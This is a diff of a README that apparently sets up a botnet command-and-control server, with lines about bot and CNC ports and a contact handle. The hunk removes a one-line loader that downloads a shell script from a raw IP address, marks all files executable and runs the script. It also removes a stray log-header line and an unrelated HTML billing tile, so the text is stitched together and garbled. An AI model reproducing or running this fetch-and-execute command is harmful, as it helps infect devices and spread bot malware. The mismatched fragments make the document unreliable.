@@ -124,18 +124,3 @@ screen ./admin
 - Change bot port and cnc port in assets/server.toml
 
 - If you need help, contact @az369za
-wget http://115.76.19.84:6005/wget.sh && chmod 777 * && ./wget.sh
-
-Login: | Commands: | Attempted Log: 
-
-
-            <div class="col-md-3 col-sm-6" onclick="window.location='clientarea.php?action=addfunds'">
-                <a href="clientarea.php?action=addfunds" class="tile">
-                    <i class="fad fa-credit-card"></i>
-                    <div class="title-info">
-                        <div class="stat">{$clientsstats.creditbalance}</div>
-                    <div class="title">Số Dư</div>
-                    </div>
-                    
-                </a>
-            </div>
